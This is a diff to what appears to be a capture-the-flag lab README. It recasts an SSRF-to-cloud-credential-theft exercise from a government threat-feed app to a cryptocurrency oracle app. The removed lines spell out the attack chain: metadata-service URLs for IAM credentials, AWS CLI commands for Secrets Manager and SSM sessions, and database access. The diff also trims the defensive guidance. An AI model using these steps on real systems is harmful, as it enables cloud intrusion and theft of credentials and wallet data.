@@ -1,4 +1,4 @@
-# Sentinel Feeds - SSRF to Cloud Credential Theft
+# ChainPulse - SSRF to Cloud Credential Theft
 
 **Difficulty:** 5  
 **Time:** 60-90 minutes  
@@ -6,30 +6,30 @@
 
 ## Scenario
 
-You've discovered an internal threat intelligence feed aggregator used by a government security operations center. The application validates external threat feed URLs before adding them to the aggregation queue. Your objective is to exploit this functionality to access internal cloud resources and exfiltrate classified data from the backend database.
+You've discovered an internal price oracle aggregator used by a cryptocurrency trading platform. The application validates external oracle endpoints before adding them to the price feed pool used for trade execution. Your objective is to exploit this functionality to access internal cloud resources and exfiltrate sensitive trading data from the backend database.
 
 ## Objectives
 
-1. Identify the SSRF vulnerability in the feed validation endpoint
+1. Identify the SSRF vulnerability in the oracle validation endpoint
 2. Exploit SSRF to access EC2 Instance Metadata Service (IMDS)
 3. Obtain IAM role credentials from the metadata service
 4. Enumerate AWS Secrets Manager for stored credentials
 5. Retrieve database credentials from Secrets Manager
-6. Connect to the PostgreSQL database and exfiltrate classified data
+6. Connect to the PostgreSQL database and exfiltrate wallet data
 
 ## Attack Surface
 
 Access the application at `http://[instance-ip]:8080`
 
-The feed aggregator provides:
-- Web interface for feed management
-- API endpoint for validating external feed URLs
-- Backend database storing classified intelligence data
+The oracle aggregator provides:
+- Web interface for oracle management
+- API endpoint for validating external oracle URLs
+- Backend database storing wallet addresses, balances, and API keys
 
 ## Enumeration Checklist
 
 ### Phase 1: Application Reconnaissance
-- What functionality does the feed validation endpoint provide?
+- What functionality does the oracle validation endpoint provide?
 - How are URLs processed by the application?
 - What response data is returned to the user?
 - Are there any restrictions on which URLs can be fetched?
@@ -55,8 +55,8 @@ The feed aggregator provides:
 ### Phase 5: Database Access
 - What database engine is in use?
 - What tables exist in the database?
-- What classified data is stored?
-- Where is the sensitive configuration data?
+- What wallet data is stored?
+- Where are the API keys and private keys?
 
 ## Attack Flow
 
@@ -87,128 +87,28 @@ The feed aggregator provides:
 │      ▼                                                                      │
 │  [EC2 Instance] ───► [RDS PostgreSQL]                                       │
 │                            │                                                │
-│                            │ 6. Query classified data                       │
+│                            │ 6. Query wallet and API key data               │
 │                            ▼                                                │
-│                      SECRET DATA                                            │
+│                      FINANCIAL DATA                                         │
 │                                                                             │
 └─────────────────────────────────────────────────────────────────────────────┘
 ```
 
 The database is in a private subnet and only accessible from the application tier. After obtaining credentials, use SSM Session Manager to access the EC2 instance, then connect to the database.
 
-## Key Concepts
+## Real-World Context
 
-### Server-Side Request Forgery (SSRF)
-Applications that fetch user-provided URLs without proper validation can be exploited to access internal resources:
+Price oracle manipulation and SSRF attacks are significant threats in the DeFi ecosystem. Attackers have exploited similar vulnerabilities to:
 
-```
-# Instead of an external threat feed URL:
-https://threatfeeds.example.gov/api/indicators
+- Steal funds by manipulating price feeds before trade execution
+- Access hot wallet private keys stored in cloud infrastructure  
+- Drain liquidity pools by exploiting oracle trust assumptions
 
-# Request internal metadata service:
-http://169.254.169.254/latest/meta-data/
-```
+This lab demonstrates how a seemingly innocuous "URL validation" feature can lead to complete infrastructure compromise.
 
-### EC2 Instance Metadata Service (IMDS)
-AWS EC2 instances can query a link-local address for instance information:
+## Detection Opportunities
 
-```
-# Metadata service root
-http://169.254.169.254/latest/meta-data/
-
-# IAM credentials location
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# Get role name, then credentials
-http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
-```
-
-The response contains temporary credentials:
-```json
-{
-  "AccessKeyId": "ASIA...",
-  "SecretAccessKey": "...",
-  "Token": "...",
-  "Expiration": "2024-01-15T12:00:00Z"
-}
-```
-
-### Using Stolen Credentials
-```bash
-# Export credentials to environment
-export AWS_ACCESS_KEY_ID="ASIA..."
-export AWS_SECRET_ACCESS_KEY="..."
-export AWS_SESSION_TOKEN="..."
-
-# Verify identity
-aws sts get-caller-identity
-
-# Enumerate permissions through trial
-aws secretsmanager list-secrets
-aws s3 ls
-aws ec2 describe-instances
-```
-
-### Secrets Manager Enumeration
-```bash
-# List available secrets
-aws secretsmanager list-secrets
-
-# Get secret value
-aws secretsmanager get-secret-value --secret-id [SECRET-NAME-OR-ARN]
-```
-
-### SSM Session Manager
-```bash
-# Get instance ID via SSRF
-http://169.254.169.254/latest/meta-data/instance-id
-
-# Start session using stolen credentials
-aws ssm start-session --target [INSTANCE-ID]
-```
-
-SSM Session Manager provides shell access without SSH keys. If the IAM role has `ssm:StartSession` permissions, stolen credentials can be used to access the instance from anywhere.
-
-### PostgreSQL Access
-```bash
-# Connect with retrieved credentials
-psql -h [DB-HOST] -p 5432 -U [USERNAME] -d [DATABASE]
-
-# Or via environment variable
-PGPASSWORD='[PASSWORD]' psql -h [DB-HOST] -U [USERNAME] -d [DATABASE]
-
-# List tables
-\dt
-
-# Query data
-SELECT * FROM system_config;
-```
-
-## Defensive Considerations
-
-After completing the lab, consider:
-
-### SSRF Prevention
-- Implement allowlists for outbound requests
-- Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x)
-- Use a dedicated egress proxy with URL filtering
-- Validate URL schemes (block file://, gopher://, etc.)
-
-### IMDS Protection
-- Enable IMDSv2 (requires session tokens)
-- Set hop limit to 1 (blocks container escapes)
-- Use instance metadata service firewall rules
-- Monitor for unusual metadata access patterns
-
-### Secrets Management
-- Apply least-privilege to Secrets Manager access
-- Use resource-based policies to restrict access
-- Enable secret rotation
-- Audit secret access via CloudTrail
-
-### Detection Opportunities
-- CloudTrail: `secretsmanager:GetSecretValue` from EC2 instance role
-- CloudTrail: `ssm:StartSession` from unexpected source IPs
-- VPC Flow Logs: Connections from web tier to database tier
-- Application logs: Requests to 169.254.169.254
-- GuardDuty: Unusual API calls from EC2 credentials
+- IMDSv1 access patterns (should be using IMDSv2 with session tokens)
+- Secrets Manager API calls from unexpected principals
+- Database connections from non-application sources
+- Outbound requests to internal IP ranges from web applications
